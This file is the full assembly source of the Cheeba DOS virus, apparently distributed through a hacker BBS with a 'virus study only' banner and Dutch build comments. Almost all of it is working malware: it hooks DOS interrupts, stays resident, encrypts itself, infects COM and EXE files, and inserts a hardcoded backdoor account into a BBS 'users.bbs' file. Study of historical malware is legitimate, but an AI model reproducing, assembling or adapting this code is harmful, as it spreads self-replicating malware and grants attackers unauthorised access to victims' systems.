;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;*** The author of Cheeba let his source lie around --- so HERE IT IS!!! ***
; Btw just one thing --- I give it 2 you as long as you don't make a
; sucking destroying thing... Btw 2 this is of course only educational...
;-----------------------------------------------------------------------------
; Naam en password staan +- op lijn 200. Verander de low-version number
; bij de verschillende versies...
; Verander verder NIKS aan het virus !!!

Com_First:      push cs
S_1:            mov ax,100h
S_2:            push ax
                mov ax,cs
CodePars:       add ax,0
                push ax
S_3:            mov ax,offset End_Virus
S_4:            push ax
                retf

VirTitle        db 'CHEEBA Makes Ya High Harmlessly-1.2 F**K THE LAMERS'

I21Hooks        db 0
                dw offset Stop_Prg
                db 31h
                dw offset Stop_Prg
                db 4Ch
                dw offset Stop_Prg
                db 4Bh
                dw offset Start_Prg
                db 45h
                dw offset Check_Init
                db 3Ch
                dw offset Open_Wrt
                db 3Dh
                dw offset Open_Rd
                db 3Eh
                dw offset Check_Close
                db 40h
                dw offset Check_Vir

New_21:         call Rest_Orig_21
                call Save_Regs
                cld
                mov bx,offset I21Hooks
Srch_Fct_Lp:    cmp ah,[bx]
                jne Wrong_Fct
                push [bx+1]
                call Retr_Regs
                ret
Wrong_Fct:      add bx,3
                cmp bx,offset New_21
                jb Srch_Fct_Lp

Go_Dos:         call Retr_Regs
                call Call_Dos
Skip_21:        call Rest_21_Jmp
                retf 2

Call_Dos:       pushf
                db 09Ah
Org_21_Addr     dw 2 dup (?)
                ret

Org_21_Code     db 5 dup (?)

;*** Fct 45 - check init ***

Check_Init:     cmp bx,0D15h
                jne Go_Dos
                mov bx,0F0Ch
                jmp short Skip_21

;*** I21 FCT 3Dh - Open file for read ***

Open_Rd:        test al,3
                jz Go_Dos
                xchg si,dx
Get_0:          lodsb
                or al,al
                jnz Get_0
                mov cx,0Ah
                xor bx,bx
                xor ax,ax
                cwd        ; Dx = 0
Get_CSum:       dec si
                rol bx,1
                mov al,[si]
                or al,20h
                xor bl,al
                add dx,ax
                loop Get_CSum
                cmp bx,1AE7h
                jne Go_Dos
                cmp dx,3B7h
                jne Go_Dos

Is_Users:       mov word ptr cs:[Save_A_Reg],si
                mov di,offset Coded
Del_Si:         mov si,word ptr cs:[Save_A_Reg]
Lp_Unc:         lodsb
                or al,al
                jz Del_Si
                or al,20h
                sub byte ptr cs:[di],al
                inc di
                cmp di,offset No_Read
                jb Lp_Unc

Coded:          call Retr_Regs
                and al,0FEh
                or al,2
                call Call_Dos
                jnc Has_Read
                jmp No_Read
Has_Read:       pushf
                call Save_Regs
                xchg bx,ax
                mov ah,3Fh
                mov cx,9Eh
                mov dx,offset End_Virus
                call Call_Dos
                mov dx,[End_Virus+20h]
                mov cx,[End_Virus+22h]
                or cx,cx
                jnz Test_Ok
                or dx,dx
                jz No_XS_YET

Test_Ok:        mov ax,4200h
                call Call_Dos
                mov ah,3Fh
                mov dx,offset End_Virus+9Eh
                mov cx,9Eh
                call Call_Dos
                cmp ax,cx
                jnz No_XS_YET
                cmp byte ptr [End_Virus+9Eh],3
                jne No_XS_YET
                test byte ptr [End_Virus+9Eh+77h],1
                jnz No_XS_YET
                mov ax,[End_Virus+84h]
                cmp ax,[End_Virus+9Eh+84h]
                jne No_XS_YET
J_Less:         jmp Less_Users

No_XS_Yet:      mov ax,4202h
                xor cx,cx
                cwd   ; Dx = 0
                call Call_Dos
                or dx,dx
                jnz More_Users
                cmp ax,9Eh*50    ; 50 users of meer
                jb J_Less

More_Users:     mov cx,9Eh
                div cx
                or dx,dx
                jnz J_Less
                shr ax,1
                mul cx
                xchg cx,dx
                xchg dx,ax
                mov ax,4200h
                call Call_Dos
Read_Lp:        mov ah,3Fh
                mov dx,offset End_Virus+9Eh
                mov cx,9Eh
                call Call_Dos
                cmp ax,cx
                jne Less_Users
                test byte ptr [offset End_Virus+9Eh+77h],1 ; Search deleted
                je Read_Lp
                mov ax,4201h
                mov cx,-1
                mov dx,-9Eh
                call Call_Dos
                push dx
                push ax
                mov [End_Virus+20h],ax
                mov [End_Virus+22h],dx
                mov ax,4200h
                xor cx,cx
                cwd  ; dx = 0
                call Call_Dos
                mov ah,40h
                mov cx,9Eh
                mov dx,offset End_Virus
                call Call_Dos
                mov ax,4200h
                pop dx
                pop cx
                call Call_Dos
                push ds
                pop es
                mov al,0
                mov di,offset End_Virus
                mov cx,106h-9Eh
                repz stosb
                mov ax,2020h
                mov cx,5
Wrt_20s:        inc di
                stosw
                loop Wrt_20s

;HIER STAAN NAAM EN PASSWORD.
; Naam en password zijn 3 chars, Name = <N1><N2><N3> , Password = <P1><P2><P3>
; Zijn dus Name = 1F 20 7E, Password = 4D 5A B8
; Staan zoals hier:
;
; mov ..., 0 <N1> <NameLen = 3>
; ..... 0 <N3> <N2>
; Password:
; ..... ,0 <P1> <PassLen = 3>
; ..... ,0 <P3> <P2>
;
                mov word ptr [End_Virus],01F03h
                mov word ptr [End_Virus+2],07E20h
                mov word ptr [End_Virus+3Eh],04D03h
                mov word ptr [End_Virus+40h],0B85Ah


                mov ah,40h
                mov cx,9Eh
                mov dx,offset End_Virus
                call Call_Dos

Less_Users:     call Go_Beg_File
                popf
                call Retr_Regs
No_Read:        pushf
                push ax
                push si
                push di
                push ds
                mov di,offset Coded
Del_Si_2:       mov si,word ptr cs:[Save_A_Reg]
Lp_Unc_2:       lodsb
                or al,al
                jz Del_Si_2
                or al,20h
                add byte ptr cs:[di],al
                inc di
                cmp di,offset No_Read
                jb Lp_Unc_2

                pop ds
                pop di
                pop si
                pop ax
                popf

                call Rest_21_Jmp
                retf 2

;*** I 21 FCT 3C - Rewrite file ***

Open_Wrt:       cld
                test byte ptr cs:[Flags],1 ; Already sure-exec opened?
                jnz J_JD_2

                push ds
                pop es
                xchg di,dx
                mov al,0
                mov cx,-1
                repnz scasb
                mov ax,[di-5]
                or ax,2020h
                cmp ax,'c.'
                jne No_Com
                mov ax,[di-3]
                or ax,2020h
                cmp ax,'mo'
                jne Open_It
Sure_Exec:      or byte ptr cs:[Flags],1
Open_It:        call Retr_Regs
                call Call_Dos
                jc Not_Opened
                mov word ptr cs:[Exec_Handle],ax
Not_Opened:     call Rest_21_Jmp
                retf 2

No_Com:         cmp ax,'e.' ; '.E'?
                jne Open_It

                mov ax,[di-3]
                or ax,2020h
                cmp ax,'ex'   ; .. 'XE'?
                je Sure_Exec
OJ_2:           jmp short Open_It

;*** I21 FCT 3E - Infect on close if orig. prog has written too ***

Check_Close:    push cs
                pop ds
                cmp bx,[Exec_Handle]                                ; Same file?
J_JD_2:         jne JD_2
                mov word ptr [Exec_Handle],0FFFFh         ; Don't follow anymore
                call Go_Beg_File                            ; Go to beg. of file
                mov ah,3Fh                                    ; Read first bytes
                mov cx,18h
                mov dx,offset Read_Buf
                call Call_Dos
                and byte ptr [Flags],0FBh                         ; Flag for COM
                cmp word ptr [Read_Buf],'ZM'                         ; MZ - Exe?
                je Infect_Exe
                test byte ptr [Flags],1                             ; Sure exec?
                jnz Infect_Com
                and byte ptr cs:[Flags],0FEh
JD_2:           jmp Go_Dos

Infect_Exe:     or byte ptr [Flags],4                             ; Flag for EXE
                mov ax,[Read_Buf+16h]
                mov [Exe_CS+1],ax
                mov ax,[Read_Buf+14h]
                mov [Exe_IP+1],ax
                cmp ax,offset Init
                je OJ_2
                mov ax,[Read_Buf+0Eh]
                mov [Exe_SS+1],ax
                mov ax,[Read_Buf+10h]
                mov [Exe_SP+1],ax
Infect_Com:     and byte ptr [Flags],0FEh
                cmp word ptr [Read_Buf],0B80Eh
                je JD_2
                cmp word ptr [Read_Buf],0BFh
                je JD_2

Not_Inf:        mov ax,4202h                                 ; Go to end of file
                xor cx,cx
                cwd ; Dx = 0
                call Call_Dos

                test byte ptr [Flags],4
                jz No_Ovl_Test

                push ax                       ; .EXE: Test for internal overlays
                push dx
                mov cx,200h
                div cx
                cmp dx,[Read_Buf+2]
                jne Is_Ovl
                or dx,dx
                jz No_Corr_Chk
                inc ax
No_Corr_Chk:    cmp ax,[Read_Buf+4]
Is_Ovl:         pop dx
                pop ax
                je No_Ovl_Test

JD_3:           jmp short JD_2

No_Ovl_Test:    add ax,0Fh                                   ; End in paragraphs
                adc dx,0
                and ax,0FFF0h

                mov Org_Fl_Len_Lo,ax
                mov Org_Fl_Len_Hi,dx

                push ax
                mov cl,4
                shr ax,cl
                mov [CodePars+1],ax
                or al,al
                jnz No_Al_0
                dec al
No_Al_0:        mov byte ptr [offset S_5-1],al
                pop ax

                push ax
                push dx

                mov cx,dx                              ; Go to end-in-paragraphs
                mov dx,ax
                mov ax,4200h
                call Call_Dos

                push cs
                pop es
                mov si,100h
                mov di,offset End_Virus
                mov cx,offset End_Virus-100h
                mov dl,byte ptr cs:[offset S_5-1]
Code_Lp:        lodsb
                cmp si,offset Init
                ja No_Code
                xor al,dl
No_Code:        stosb
                loop Code_Lp

                mov ax,5700h
                call Call_Dos
                mov Org_Fl_Time,cx
                mov Org_Fl_Date,dx

                mov ah,40h                          ; Write virus behind program
                mov cx,offset End_Virus-100h
                mov dx,offset End_Virus
                call Call_Dos

                call Go_Beg_File

                mov dx,offset Com_First
                mov cx,10h

                pop si
                pop ax

                test byte ptr [Flags],4
                jz Init_Com

                mov dx,si
                mov cx,4
Get_CS:         shr dx,1
                rcr ax,1
                loop Get_CS

                sub ax,[Read_Buf+8]                              ; - header size
                sub ax,10h
                mov [Read_Buf+16h],ax
                mov [Read_Buf+0Eh],ax
                mov word ptr [Read_Buf+14h],offset Init
                mov word ptr [Read_Buf+10h],offset End_Virus+100h

                mov ax,Org_Fl_Len_Lo
                mov dx,Org_Fl_Len_Hi

                add ax,offset End_Virus-100h
                adc dx,0
                mov cx,200h
                div cx
                or dx,dx
                jz No_Corr
                inc ax
No_Corr:        mov [Read_Buf+2],dx
                mov [Read_Buf+4],ax
                mov dx,offset Read_Buf
                mov cx,18h

Init_Com:       mov ah,40h
                call Call_Dos

                mov ax,5701h
                mov cx,Org_Fl_Time
                mov dx,Org_Fl_Date
                call Call_Dos

JD_4:           jmp short JD_3


;*** 00 / 31 / 4C: End program ***

Stop_Prg:       push ds
                push bx
                lds bx,cs:[Jmp_22+1]
                cli
                mov byte ptr [bx],0EAh
                mov word ptr [bx+1],offset Int_22
                mov word ptr [bx+3],cs
                sti
                pop bx
                pop ds
                jmp short JD_4

Int_22:         call Rest_21_Jmp
                push cs
                pop ds
                les di,dword ptr [Jmp_22+1]
                mov si,offset Org_22
                call Move_Bytes
                call Retr_Regs
Jmp_22:         jmp 0:0

Org_22          db 5 dup (?)

;*** Start prog ***

Start_Prg:      lds bx,cs:[Jmp_13+1]
                cli
                mov byte ptr [bx],0EAh
                mov word ptr [bx+1],offset Int_13
                mov word ptr [bx+3],cs
                sti
                call Retr_Regs
JD_5:           jmp short JD_4

Int_13:         call Rest_21_Jmp
                push si
                push di
                push ds
                push es
                push cs
                pop ds
                les di,dword ptr [Jmp_13+1]
                mov si,offset Org_13
                call Move_Bytes
                pop es
                pop ds
                pop di
                pop si
Jmp_13:         jmp 0:0

Org_13          db 5 dup (?)

;*** Check for string 'iru' (vIRUs) ***

Check_Vir:      cmp bx,cs:[Exec_Handle]
                jne No_Vir
                sub cx,2
                jc No_Vir
                push ds
                pop es
                mov di,dx
                mov al,'i'
Iru_Lp:         repnz scasb
                jnz No_Vir
                cmp word ptr [di],'ur'
                jne Iru_Lp
                mov word ptr cs:[Exec_Handle],0FFFFh
                and byte ptr cs:[Flags],0FEh
No_Vir:         jmp short JD_5


Move_Bytes:     cli
                cld
                movsw
                movsw
                movsb
                sti
                ret

Rest_Orig_21:   push si
                push di
                push ds
                push es
                push cs
                pop ds
                mov si,offset Org_21_Code
                les di,dword ptr [Org_21_Addr]
                call Move_Bytes
                pop es
                pop ds
                pop di
                pop si
                ret

Rest_21_Jmp:    push ds
                push bx
                lds bx,dword ptr cs:[Org_21_Addr]
                cli
                mov byte ptr [bx],0EAh
                mov word ptr [bx+1],offset New_21
                mov word ptr [bx+3],cs
                sti
                pop bx
                pop ds
                ret

;*** Proc: Save regs ***

Save_Regs:      mov word ptr cs:[Save_Ds],ds
                push cs
                pop ds
                mov word ptr [Save_Ax],ax
                mov word ptr [Save_Bx],bx
                mov word ptr [Save_Cx],cx
                mov word ptr [Save_Dx],dx
                mov word ptr [Save_Si],si
                mov word ptr [Save_Di],di
                mov word ptr [Save_Es],es
                ret

Retr_Regs:      push cs
                pop ds
                mov ax,word ptr [Save_Ax]
                mov bx,word ptr [Save_Bx]
                mov cx,word ptr [Save_Cx]
                mov dx,word ptr [Save_Dx]
                mov si,word ptr [Save_Si]
                mov di,word ptr [Save_Di]
                mov es,word ptr [Save_Es]
                mov ds,word ptr [Save_Ds]
                ret

Go_Beg_File:    mov ax,4200h
                xor cx,cx
                cwd ; dx = 0
                call Call_Dos
                ret

Exec_Handle     dw 0FFFFh              ; Handle of opened-with-write- exec. file

Flags           db (?) ; Flags: 1 = Sure exec (- Maybe data)
                              ; 4 = EXE-file (- COM)

Org_Fl_Len_Lo   dw (?)
Org_Fl_Len_Hi   dw (?)

Org_Fl_Time     dw (?)
Org_Fl_Date     dw (?)

Save_Ax         dw (?)
Save_Bx         dw (?)
Save_Cx         dw (?)
Save_Dx         dw (?)
Save_Si         dw (?)
Save_Di         dw (?)
Save_Ds         dw (?)
Save_Es         dw (?)

Save_A_Reg      dw (?)

Decoded:        mov word ptr cs:[Save_A_Reg],ds
                push ax
                push bx
                push cx
                push dx
                push ds
                push es

                mov ah,45h
                mov bx,0D15h
                int 21h
                cmp bx,0F0Ch
                jne N_Y_Inst
                jmp Jmp_No_Init
N_Y_Inst:       cld

                xor ax,ax
                mov ds,ax

                mov ax,[88h]                                     ; Save I22 addr
                mov cs:[Jmp_22+1],ax
                mov ax,[8Ah]
                mov cs:[Jmp_22+3],ax

                mov ax,[04Ch]                                    ; Save I13 addr
                mov cs:[Jmp_13+1],ax
                mov dx,[04Eh]
                mov cs:[Jmp_13+3],dx

                mov ah,52h
                int 21h
                cmp dx,es:[bx-2]
                jnb Jmp_No_Init

                push [84h]
                push [86h]

                push cs
                pop ds

                push cs
                pop es

                mov si,offset Com_First
                mov di,offset Com_Start_2

MoveStrt:       lodsw                           ; Other .COM start-up
                cmp si,offset CodePars+3
                je No_MS_Lp
                xchg ax,[di]
                mov [si-2],ax
                inc di
                inc di
No_MS_Lp:       cmp si,offset VirTitle
                jb MoveStrt

                xor byte ptr [Init],1
                xor byte ptr [S_9],6Ch
                xor byte ptr [Decode_Lp+2],1
                xor byte ptr [S_5],1
                xor byte ptr [S_6+1],1
                xor byte ptr [S_7],7
                xor byte ptr [S_8],6Ch ; Nop <> CLD

                mov ax,word ptr cs:[Save_A_Reg]
                dec ax
MCB_Loop:       mov ds,ax
                cmp byte ptr [0],'Z'
                je Found_End_MCB
                add ax,[3]
                inc ax
                cmp ah,0A0h
                jb MCB_Loop
                add sp,4
Jmp_No_Init:    jmp short No_Init

Found_End_MCB:  mov bx,[3]
Here_Pars:      sub bx,100h ; Filled in init-proc.
                jc No_Init
                mov [3],bx
                add ax,bx
                inc ax
                mov ds,cs:[Save_A_Reg]
                mov word ptr [2],ax
                sub ax,10h
                mov cx,offset End_Virus-100h
                push cs
                pop ds
                mov es,ax
                mov si,100h
                mov di,si
                repz movsb

                pop ds
                pop si

                mov es:[Org_21_Addr],si
                mov es:[Org_21_Addr+2],ds

                mov di,offset Org_21_Code

                call Move_Bytes

                cli
                mov byte ptr [si-5],0EAh
                mov word ptr [si-4],offset New_21
                mov word ptr [si-2],es
                sti

                lds si,cs:[Jmp_22+1]
                mov di,offset Org_22

                call Move_Bytes

                lds si,cs:[Jmp_13+1]
                mov di,offset Org_13

                call Move_Bytes

No_Init:        pop es
                pop ds
                pop dx
                pop cx
                pop bx
                pop ax

                test cs:Flags,4
                jnz Rest_Stack

                push ds
                push cs
                pop ds
                mov cx,10h
                mov si,offset Read_Buf
                mov di,100h
                repz movsb
                pop ds
                retf

Rest_Stack:     mov ax,ds       ; Stack restore for .EXE files
Exe_SS:         add ax,0
                add ax,10h
                cli
                mov ss,ax
Exe_SP:         mov sp,0
                sti
                mov ax,ds
Exe_Cs:         add ax,0
                add ax,10h
                push ax
Exe_Ip:         mov ax,0
                push ax
                retf

Com_Start_2:    mov di,100h
                push cs
                mov ax,cs
                push di
                db 05h                  ; Add Ax,xxxx
                mov di,offset Init
                push ax
                push di
                retf

;*** INIT - ONLY DECODE - PART ***

Init:           mov si,offset Com_First
S_9:            cld
Decode_Lp:      xor byte ptr cs:[si],0
S_5:            inc si
S_6:            cmp si,offset Init
S_7:            jne Decode_Lp
S_8:            nop
                jmp Decoded

Read_Buf        db 0CDh,20h
                db 16h dup (?)

End_Virus:      cld
                mov word ptr [S_3+1],offset Init
           mov word ptr [Here_Pars+2],(((offset End_Virus-101h) shr 4) +1) shl 1
                mov di,offset Coded
New_Us:         mov si,offset User_St
B_V_CLp:        lodsb
                or al,al
                jz New_Us
                add [di],al
                inc di
                cmp di,offset No_Read
                jb B_V_CLp
                jmp Init

User_St         db 'users.bbs',0

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;
;컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴컴;
;컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;

